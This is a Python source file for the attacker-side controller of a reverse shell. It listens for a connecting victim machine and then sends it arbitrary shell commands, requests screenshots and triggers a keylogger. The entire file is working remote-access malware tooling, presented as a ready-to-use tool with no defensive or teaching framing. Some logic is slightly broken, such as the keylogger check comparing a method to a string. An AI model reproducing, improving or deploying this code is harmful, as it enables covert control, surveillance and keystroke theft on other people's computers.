import socket
import subprocess
import time
import os
import sys
import base64

#   Reverse Shell, created by: @cryptoplusplus
def image_size(client,response):    #   For img size...
    received = 0
    expected = len(response)
    
    msg = str()
    while received < expected:
        data = client.recv(512)
        received += len(data)
        msg += data.decode("utf-8")
    return msg

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
class Rev:
    def __init__(self):
        print("Welcome to Reverse Shell, enjoy! ~*~ ")
        ip = input("Enter IP address for socket binding: ")
        port = int(input("Enter port for socket biding: "))
        sock.bind((ip, port))   #   Change to wanted IP address and PORT (Can be used with port forwarding, for WAN)
        sock.listen(5)
        print()
        print(f"[*] Listening on: {ip}:{port}...")
    def start_shell(self, command):
        clientsocket, addr = sock.accept()  #   Declaring client socket and address
        print(f"Connection established from {addr[0]}:{addr[1]} !")
        bytesreceived = clientsocket.recv(4096)
        printcwd = bytesreceived.decode("utf-8")
        i = 0
        index = 1
        dir = []    #   Directory list, for storing current working directory
        dir.append(printcwd)    #   Appending current working directory to dir
        time.sleep(10)
        while True:
            command = input(dir[i] + '>')   #   Input with getcwd() module
            cd_chdir = command
            if command.lower() == "cls":    #   Clear screen
                os.system("CLS")
            if cd_chdir[:2] == 'cd':    #   Change directory solution - cd
                clientsocket.send(command.encode("utf-8"))
                rcv_cd = clientsocket.recv(4096)
                dir.append(rcv_cd.decode("utf-8"))
                i += 1
            if cd_chdir[:5] == 'chdir': #   Change directory solution - chdir
                clientsocket.send(command.encode("utf-8"))
                recive = clientsocket.recv(4096)
                dir.append(recive.decode("utf-8"))
                i += 1
            if command.lower() == "screenshot":
                clientsocket.send("screenshot".encode("utf-8"))
                file = f"./screenshot{index}.png"
                try:                                            
                    f = open(file, "x")           
                    f.close()
                except:
                    pass
                finally:
                    f = open(file, "wb")
                imgsize = int(image_size(clientsocket, str(3)))
                buffer = clientsocket.recv(imgsize)
                f.write(buffer)
                print(f"Screenshot saved as screenshot{index}.png")
                index += 1
                f.close()
            if command.split == "keylogger":
                print(f"[*] Listening for a minute for all pressed keys (if any)...")   #   Just used for testing...
                clientsocket.send(command.encode("utf-8"))
                #   You will get output in the console
            if command == "":   #   If the command is empty, pass
                pass
            if command.lower() == "exit":   #   Close connection
                clientsocket.close()
                sock.close()
                sys.exit()
            if len(command) > 0:    #   If the lenght of the command is greater than zero
                if cd_chdir[:2] == 'cd':    
                    print()
                elif cd_chdir[:5] == 'chdir':
                    print()
                elif command == "screenshot":
                    print()
                else:   #   Pass the command to the client
                    cmd = command
                    encoded = cmd.encode("utf-8")
                    clientsocket.send(encoded)
                    received = clientsocket.recv(4096)
                    recv = received.decode("utf-8")
                    print(recv)
            else:
                pass
            
            
start_shell = Rev()
start_shell.start_shell("")


